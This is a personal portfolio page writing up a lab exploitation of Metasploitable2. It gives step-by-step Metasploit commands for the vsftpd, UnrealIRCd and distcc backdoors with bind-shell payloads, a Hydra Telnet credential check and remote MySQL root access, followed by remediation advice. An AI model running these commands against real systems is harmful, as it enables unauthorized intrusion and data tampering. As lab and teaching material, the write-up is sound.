<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Metasploitable2 — Exploitation | Shayaan Rashedin</title>
  <link rel="stylesheet" href="style.css" />
  <script defer src="script.js"></script>
</head>
<body>
  <!-- Global header -->
  <header class="site-header">
    <div class="container header-inner">
      <a class="brand" href="index.html" aria-label="Homepage">
        <span class="brand-mark">SR</span>
        <span class="brand-text">Shayaan Rashedin</span>
      </a>
      <nav aria-label="Primary">
        <a href="projects.html">Projects</a>
        <a href="homelab.html" class="active" aria-current="page">Home Lab</a>
        <a href="resume.html">Resume</a>
        <a href="contact.html">Contact</a>
      </nav>
      <button id="theme-toggle" class="btn sm">Toggle Theme</button>
    </div>
  </header>

  <main class="container project-body">
    <!-- Hero -->
    <section class="proj-hero">
      <h1 class="page-title">Metasploitable2 — Exploitation</h1>
      <p class="meta-line">
        Exploitation and impact validation against intentionally vulnerable services in an isolated lab. Evidence-driven, recruiter-friendly.
      </p>
      <div class="chips">
        <span class="chip">Tools: Kali Linux, Metasploit, Nmap, Hydra, MariaDB client</span>
        <span class="chip">Target: 192.168.56.101</span>
        <span class="chip">Attacker: 192.168.56.102</span>
        <span class="chip">Network: 192.168.56.0/24 (host-only)</span>
      </div>
    </section>

    <!-- Overview -->
    <section>
      <h2>Project Overview</h2>
      <p>
        Building on the recon project, this page documents exploitation of exposed services on Metasploitable2
        and the resulting proof artifacts. Each section includes rationale, exact commands (in dropdowns),
        and Figures captured from the session. Work was performed on isolated lab VMs only.
      </p>
    </section>

    <!-- Setup & Environment -->
    <section>
      <h2>Setup &amp; Environment</h2>
      <p>
        VirtualBox host-only network (<code>192.168.56.0/24</code>) with Kali (attacker) and Metasploitable2 (target). Snapshots taken prior to exploitation.
      </p>

      <div class="evidence-grid">
        <figure>
          <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/ping-2.png" alt="ICMP reachability test" />
          <figcaption>Figure 01 — Connectivity pre-check: <code>ping -c 2 192.168.56.101</code>.</figcaption>
        </figure>
        <figure>
          <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/ifconfig_exploit.png" alt="Target interface configuration" />
          <figcaption>Figure 02 — Target NIC shows <code>192.168.56.101</code>.</figcaption>
        </figure>
        <figure>
          <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/msfconsole.png" alt="Metasploit console" />
          <figcaption>Figure 03 — Metasploit initialized on Kali.</figcaption>
        </figure>
      </div>

      <div class="accordion">
        <div class="accordion-item">
          <div class="accordion-header" aria-controls="cfg-exploit" aria-expanded="false">Configuration snippets</div>
          <div id="cfg-exploit" class="accordion-content">
<pre><code># Kali (attacker) — confirm addressing
ip addr show eth1
# → inet 192.168.56.102/24

# Metasploitable2 (target)
ifconfig eth0
# → inet addr:192.168.56.101  Mask:255.255.255.0

# VirtualBox host-only: vboxnet0 | 192.168.56.0/24 | DHCP disabled
</code></pre>
          </div>
        </div>
      </div>
    </section>

    <!-- Recon summary -->
    <section>
      <h2>Recon Summary (brief)</h2>
      <div class="evidence-grid">
        <figure>
          <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/nmap-sv-targeted.png" alt="Targeted nmap service scan" />
          <figcaption>Figure 04 — Targeted service scan: <code>vsftpd 2.3.4</code> (21), <code>telnet</code> (23), <code>rsh/rexec</code> (512–514), <code>distccd</code> (3632), <code>UnrealIRCd</code> (6667).</figcaption>
        </figure>
      </div>
      <div class="accordion">
        <div class="accordion-item">
          <div class="accordion-header" aria-controls="cmds-recon" aria-expanded="false">Commands — Recon quick reference</div>
          <div id="cmds-recon" class="accordion-content">
<pre><code>sudo nmap -sV -p 21,23,512-514,3632,6667 192.168.56.101
</code></pre>
          </div>
        </div>
      </div>
    </section>

    <!-- Exploitation -->
    <section>
      <h2>Exploitation — Procedure, Evidence &amp; Proof</h2>
      <p>Sections below include rationale, exact commands, and Figures for shells/proofs. All activity remained inside the lab.</p>

      <!-- vsftpd -->
      <article class="project-section">
        <h3>Exploit 1 — vsftpd 2.3.4 Backdoor (<a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523" target="_blank" rel="noopener">CVE-2011-2523</a>)</h3>
        <p><strong>Rationale:</strong> Known backdoored release on port 21; provides quick remote shell for validation.</p>
        <div class="info-card" role="note" aria-label="vsftpd mechanism">
  <h4 style="margin:0 0 6px">Mechanism — why this works</h4>
  <p style="margin:0">
    Version <code>2.3.4</code> shipped with a Trojaned backdoor: when a client supplies a username that ends with
    <code>:)</code>, the daemon spawns a shell bound to TCP <code>6200</code>. Because the service runs with elevated
    privileges on Metasploitable2, connecting to that port yields a root shell, which the Metasploit module automates.
    <span class="muted">(Ref: CVE-2011-2523)</span>
  </p>
</div>


        <div class="evidence-grid">
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/vsftpd-search.png" alt="Metasploit search vsftpd" />
            <figcaption>Figure 05 — Module discovery: <code>exploit/unix/ftp/vsftpd_234_backdoor</code>.</figcaption>
          </figure>
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/vsftpd-exploit.png" alt="vsftpd exploit evidence" />
            <figcaption>Figure 06 — Shell as root via vsftpd backdoor; proof at <code>/tmp/proof_vsftpd.txt</code>.</figcaption>
          </figure>
        </div>

        <div class="accordion">
          <div class="accordion-item">
            <div class="accordion-header" aria-controls="cmd-vsftpd" aria-expanded="false">Commands — vsftpd 2.3.4 backdoor</div>
            <div id="cmd-vsftpd" class="accordion-content">
<pre><code>msfconsole -q
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
set RPORT 21
set PAYLOAD cmd/unix/interact
run

id; whoami; uname -a
echo "pwned via vsftpd $(date)" | tee /tmp/proof_vsftpd.txt
cat /tmp/proof_vsftpd.txt
</code></pre>
            </div>
          </div>
        </div>
      </article>

      <!-- UnrealIRCd -->
      <article class="project-section">
        <h3>Exploit 2 — UnrealIRCd 3.2.8.1 Backdoor (<a href="https://nvd.nist.gov/vuln/detail/CVE-2010-2075" target="_blank" rel="noopener">CVE-2010-2075</a>)</h3>
        <p><strong>Rationale:</strong> Backdoored tarball allows command execution on port 6667; reliable in Metasploitable2.</p>
<div class="info-card" role="note" aria-label="UnrealIRCd mechanism">
  <h4 style="margin:0 0 6px">Mechanism — why this works</h4>
  <p style="margin:0">
    The official 3.2.8.1 source tarball was compromised in 2010 and contained a backdoor that executes arbitrary
    commands sent by an unauthenticated client during early connection handling. The Metasploit module delivers a
    simple command payload that the backdoored server runs, establishing a bind shell on the target.
    <span class="muted">(Ref: CVE-2010-2075)</span>
  </p>
</div>

        <div class="evidence-grid">
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/unreal-search.png" alt="Metasploit search unreal_ircd" />
            <figcaption>Figure 07 — Module discovery: <code>exploit/unix/irc/unreal_ircd_3281_backdoor</code>.</figcaption>
          </figure>
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/unreal-exploit.png" alt="UnrealIRCd exploitation and proof" />
            <figcaption>Figure 08 — Bind shell established; proof at <code>/tmp/proof_unreal.txt</code>.</figcaption>
          </figure>
        </div>

        <div class="accordion">
          <div class="accordion-item">
            <div class="accordion-header" aria-controls="cmd-unreal" aria-expanded="false">Commands — UnrealIRCd backdoor</div>
            <div id="cmd-unreal" class="accordion-content">
<pre><code>msfconsole -q
search unreal_ircd
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.101
set RPORT 6667
set PAYLOAD cmd/unix/bind_perl
set LPORT 4444
run

id; whoami; hostname
echo "pwned via unrealircd $(date)" > /tmp/proof_unreal.txt
cat /tmp/proof_unreal.txt
</code></pre>
            </div>
          </div>
        </div>
      </article>

      <!-- distcc -->
      <article class="project-section">
        <h3>Exploit 3 — distcc Command Execution (<a href="https://nvd.nist.gov/vuln/detail/CVE-2004-2687" target="_blank" rel="noopener">CVE-2004-2687</a>)</h3>
        <p><strong>Rationale:</strong> Unauthenticated command execution when distcc is exposed. Module provides reliable RCE.</p>
<div class="info-card" role="note" aria-label="distcc mechanism">
  <h4 style="margin:0 0 6px">Mechanism — why this works</h4>
  <p style="margin:0">
    <code>distccd</code> accepts build jobs over the network and, in vulnerable configurations, performs no
    authentication. The job protocol allows the client to supply arbitrary compiler commands, which the daemon
    executes (e.g., <code>/bin/sh -c</code>). The module abuses that to run system commands and expose a bind shell.
    <span class="muted">(Ref: CVE-2004-2687)</span>
  </p>
</div>

        <div class="evidence-grid">
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/distcc-search.png" alt="Metasploit search distcc" />
            <figcaption>Figure 09 — Module discovery: <code>exploit/unix/misc/distcc_exec</code>.</figcaption>
          </figure>
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/distcc-exploit.png" alt="distcc exploit and proof" />
            <figcaption>Figure 10 — Bind shell on <code>192.168.56.101:4447</code>; proof at <code>/tmp/proof_distcc.txt</code>.</figcaption>
          </figure>
        </div>

        <div class="accordion">
          <div class="accordion-item">
            <div class="accordion-header" aria-controls="cmd-distcc" aria-expanded="false">Commands — distcc (payload &amp; handler exactly as run)</div>
            <div id="cmd-distcc" class="accordion-content">
<pre><code>msfconsole -q
use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.56.101
set RPORT 3632
show payloads
set PAYLOAD cmd/unix/bind_perl
set LPORT 4447
run

uname -a
echo "pwned via distcc $(date)" | tee /tmp/proof_distcc.txt
cat /tmp/proof_distcc.txt
</code></pre>
            </div>
          </div>
        </div>
      </article>

      <!-- Telnet / r-services validations -->
      <article class="project-section">
        <h3>Validations — Telnet Credentials &amp; r-services</h3>
        <p><strong>Rationale:</strong> Confirm weak defaults on Telnet and assess r-services trust behavior.</p>
<div class="info-card" role="note" aria-label="Telnet mechanism">
  <h4 style="margin:0 0 6px">Mechanism — why this matters</h4>
  <p style="margin:0">
    Telnet transmits credentials in cleartext and is often paired with weak or default accounts on legacy systems.
    In this lab, <code>msfadmin:msfadmin</code> authenticated over Telnet, demonstrating poor credential hygiene and
    an unencrypted remote-access path that would be trivially intercepted on a real network.
  </p>
</div>

        <div class="evidence-grid">
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/telnet-login.png" alt="Interactive Telnet login" />
            <figcaption>Figure 11 — Telnet interactive login as <code>msfadmin</code> (<em>legacy demo account</em>).</figcaption>
          </figure>
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/hydra-telnet.png" alt="Hydra single-credential validation" />
            <figcaption>Figure 12 — Hydra confirms <code>msfadmin:msfadmin</code> on Telnet.</figcaption>
          </figure>
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/rservices-attempts.png" alt="rlogin/rsh attempts" />
            <figcaption>Figure 13 — <code>rlogin</code>/<code>rsh</code> refused (no NULL-byte handshake) — not trusted.</figcaption>
          </figure>
        </div>

        <div class="accordion">
          <div class="accordion-item">
            <div class="accordion-header" aria-controls="cmd-telnet" aria-expanded="false">Commands — Telnet &amp; r-services checks</div>
            <div id="cmd-telnet" class="accordion-content">
<pre><code># Telnet (interactive)
telnet 192.168.56.101

# Hydra single-credential validation (matches figure)
hydra -l msfadmin -p msfadmin telnet://192.168.56.101

# r-services behavior (not trusted)
sudo rlogin -l root 192.168.56.101
sudo rsh -l root 192.168.56.101 id
</code></pre>
            </div>
          </div>
        </div>
      </article>

      <!-- MySQL proof -->
      <article class="project-section">
        <h3>Validation — MySQL Remote Access &amp; Write Proof</h3>
        <p><strong>Rationale:</strong> Exposed 3306/tcp accepted remote root login and permitted write operations.</p>
<div class="info-card" role="note" aria-label="MySQL mechanism">
  <h4 style="margin:0 0 6px">Mechanism — why this works</h4>
  <p style="margin:0">
    The MySQL service listens on <code>0.0.0.0:3306</code> and permits remote root authentication, a classic
    misconfiguration on Metasploitable2. With network access and permissive GRANTs, an attacker can log in from the
    attacker host, enumerate schema, and modify data—shown here by creating a database and writing a proof row.
  </p>
</div>

        <div class="evidence-grid">
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/mysql_3306_nmap_service_scan.png" alt="nmap service detection for MySQL 3306" />
            <figcaption>Figure 14 — Service detection: <code>MySQL 5.0.51a-3ubuntu5</code>.</figcaption>
          </figure>
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/mysql_root_connect.png" alt="MariaDB client connect as root" />
            <figcaption>Figure 15 — MariaDB connects as <code>root</code> over TCP.</figcaption>
          </figure>
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/mysql_show_databases.png" alt="SHOW DATABASES output" />
            <figcaption>Figure 16 — <code>SHOW DATABASES;</code> reveals lab apps.</figcaption>
          </figure>
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/mysql_proofdb_insert_select.png" alt="proofdb insert/select evidence" />
            <figcaption>Figure 17 — Created <code>proofdb</code>, inserted timestamped row, and read it back.</figcaption>
          </figure>
        </div>

        <div class="accordion">
          <div class="accordion-item">
            <div class="accordion-header" aria-controls="cmd-mysql" aria-expanded="false">Commands — MySQL enumeration &amp; proof</div>
            <div id="cmd-mysql" class="accordion-content">
<pre><code># Service confirmation
nmap -sV -p 3306 192.168.56.101

# Remote login
mariadb --skip-ssl --protocol=TCP -h 192.168.56.101 -u root -p

# SQL session
SELECT USER(), VERSION();
SHOW DATABASES;

CREATE DATABASE proofdb;
USE proofdb;
CREATE TABLE proof(msg VARCHAR(128));
INSERT INTO proof VALUES (CONCAT('pwned via mysql ', NOW()));
SELECT * FROM proof;
</code></pre>
            </div>
          </div>
        </div>
      </article>

      <!-- Post-exploitation validation -->
      <article class="project-section">
        <h3>Post-exploitation Validation</h3>
        <p>Captured system context and a dated proof artifact to document impact.</p>

        <div class="evidence-grid">
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/postex-systeminfo.png" alt="whoami, id, ip addr, release" />
            <figcaption>Figure 18 — Identity, kernel, IP configuration, and OS release.</figcaption>
          </figure>
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/postex-proof.png" alt="Proof file written in /tmp" />
            <figcaption>Figure 19 — Banner + dated proof file in <code>/tmp/proof_postex.txt</code>.</figcaption>
          </figure>
        </div>

        <div class="accordion">
          <div class="accordion-item">
            <div class="accordion-header" aria-controls="cmd-postex" aria-expanded="false">Commands — Post-ex validation</div>
            <div id="cmd-postex" class="accordion-content">
<pre><code>whoami && id
hostname && uname -a
ip addr || ifconfig
cat /etc/*release* | head -n1

# Persistent proof file (example)
echo "$(date): Access confirmed on $(hostname)" | tee /tmp/proof_postex.txt
ls -l /tmp/proof_postex.txt && cat /tmp/proof_postex.txt
</code></pre>
            </div>
          </div>
        </div>
      </article>
    </section>

    <!-- Analysis & Findings -->
    <section>
      <h2>Analysis &amp; Findings</h2>
      <div class="table-scroll">
        <table class="checklist-table">
          <thead>
            <tr><th>Service</th><th>Port</th><th>Exploit / Validation</th><th>CVE</th><th>Impact (lab)</th></tr>
          </thead>
        <tbody>
          <tr>
            <td>vsftpd</td><td>21/tcp</td>
            <td>Metasploit <code>exploit/unix/ftp/vsftpd_234_backdoor</code></td>
            <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523" target="_blank" rel="noopener">CVE-2011-2523</a></td>
            <td>Unauthenticated remote shell; proof file</td>
          </tr>
          <tr>
            <td>UnrealIRCd</td><td>6667/tcp</td>
            <td>Metasploit <code>exploit/unix/irc/unreal_ircd_3281_backdoor</code> (bind Perl)</td>
            <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2010-2075" target="_blank" rel="noopener">CVE-2010-2075</a></td>
            <td>Remote command execution; proof file</td>
          </tr>
          <tr>
            <td>distcc</td><td>3632/tcp</td>
            <td><code>exploit/unix/misc/distcc_exec</code> → <code>cmd/unix/bind_perl</code> LPORT 4447</td>
            <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2004-2687" target="_blank" rel="noopener">CVE-2004-2687</a></td>
            <td>Remote command execution; proof file</td>
          </tr>
          <tr>
            <td>Telnet</td><td>23/tcp</td>
            <td>Interactive login + Hydra validates <code>msfadmin:msfadmin</code></td>
            <td>—</td>
            <td>Weak credential exposure</td>
          </tr>
          <tr>
            <td>MySQL</td><td>3306/tcp</td>
            <td>Remote root login; created <code>proofdb</code> and wrote row</td>
            <td>—</td>
            <td>Data exposure &amp; integrity risk</td>
          </tr>
          <tr>
            <td>r-services</td><td>512–514/tcp</td>
            <td><code>rlogin</code>/<code>rsh</code> not trusted (refused)</td>
            <td>—</td>
            <td>No direct impact in this config; document &amp; monitor</td>
          </tr>
        </tbody>
        </table>
      </div>
      <p class="muted">All activity performed on intentionally vulnerable systems inside a closed lab.</p>
    </section>

    <!-- Remediation -->
    <section>
      <h2>Remediation &amp; Defensive View</h2>
      <ul>
        <li><strong>Remove/upgrade backdoored services</strong> (vsftpd 2.3.4, UnrealIRCd 3.2.8.1). Apply vendor-supported packages only.</li>
        <li><strong>Disable distcc</strong> or restrict to trusted build hosts via host firewall; segment build infrastructure; monitor for 3632/tcp.</li>
        <li><strong>Eliminate Telnet</strong>; enforce SSH with key-based auth, disable default accounts, credential rotation and MFA for remote access.</li>
        <li><strong>MySQL hardening:</strong> bind to <code>localhost</code> or restricted subnets, remove defaults, least privilege, upgrade from EOL 5.0.x, enable auth plugins and TLS when applicable.</li>
        <li><strong>Attack-surface reduction:</strong> service minimization, CIS baselines, package allow-listing. SIEM alerts for 21/23/3632/6667/3306.</li>
      </ul>
    </section>

    <!-- MITRE -->
    <section>
      <h2>MITRE ATT&amp;CK Mapping</h2>
      <table class="checklist-table">
        <thead><tr><th>Technique</th><th>Notes</th></tr></thead>
        <tbody>
          <tr><td>T1595 — Active Scanning</td><td>Target selection from service recon.</td></tr>
          <tr><td>T1190 — Exploit Public-Facing Application</td><td>vsftpd, UnrealIRCd, distcc exploitation.</td></tr>
          <tr><td>T1110 — Brute Force</td><td>Hydra credential validation for Telnet.</td></tr>
          <tr><td>T1059 — Command &amp; Scripting Interpreter</td><td>Remote commands to create proof artifacts.</td></tr>
        </tbody>
      </table>
    </section>

    <!-- Reflection -->
    <section>
      <h2>Reflection &amp; Recruiter Takeaways</h2>
      <ul>
        <li><strong>Skills:</strong> Precise module selection &amp; payload tuning, credential testing, DB enumeration, reproducible evidence capture, defender-minded remediation.</li>
        <li><strong>Outcome:</strong> Clear exploitation evidence across multiple services with practical hardening guidance translatable to production environments.</li>
      </ul>
    </section>

    <!-- Back link -->
    <section style="margin: 28px 0 8px;">
      <a class="btn neutral" href="homelab.html">← Back to Home Lab</a>
    </section>
  </main>

  <footer>
    <div class="container footer-inner">
      <p>© 2025 Shayaan Rashedin</p>
      <div class="footer-links">
        <a href="mailto:shayaan.rashedin@torontomu.ca">Email</a>
        <a href="www.linkedin.com/in/shayaanrashedin" target="_blank" rel="noopener">LinkedIn</a>
        <a href="https://github.com/ShayaanRashedin" target="_blank" rel="noopener">GitHub</a>
      </div>
    </div>
  </footer>

  <!-- Lightbox -->
  <div id="lightbox" onclick="closeLightbox()">
    <img id="lightbox-img" alt="expanded figure" />
  </div>
</body>
</html>
